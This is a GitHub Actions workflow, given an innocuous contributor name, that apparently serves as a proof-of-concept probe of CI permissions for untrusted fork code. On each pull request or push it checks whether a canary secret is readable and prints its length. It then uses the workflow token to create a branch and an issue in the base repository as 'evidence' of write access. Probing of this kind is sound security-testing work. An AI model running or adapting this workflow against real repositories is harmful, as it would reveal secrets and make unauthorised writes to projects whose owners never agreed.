name: contributor-workflow
on: [pull_request, push]
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - env:
          S: ${{ secrets.FORK_CANARY }}
        run: |
          echo "EVIDENCE event=${{ github.event_name }} ref=${{ github.ref }}"
          echo "EVIDENCE secret readable: ${S:+yes}"
          echo "EVIDENCE secret length: ${#S}"
      - name: what can this token write in the base repository
        run: |
          c=$(curl -s -o /tmp/o -w "%{http_code}" -X POST \
            -H "Authorization: token ${{ github.token }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/${{ github.repository }}/git/refs \
            -d '{"ref":"refs/heads/written-by-untrusted-fork-code","sha":"${{ github.sha }}"}')
          echo "EVIDENCE create-ref-in-base-repo=$c"
          c2=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
            -H "Authorization: token ${{ github.token }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/${{ github.repository }}/issues \
            -d '{"title":"written by untrusted fork code","body":"integrity proof"}')
          echo "EVIDENCE create-issue-in-base-repo=$c2"
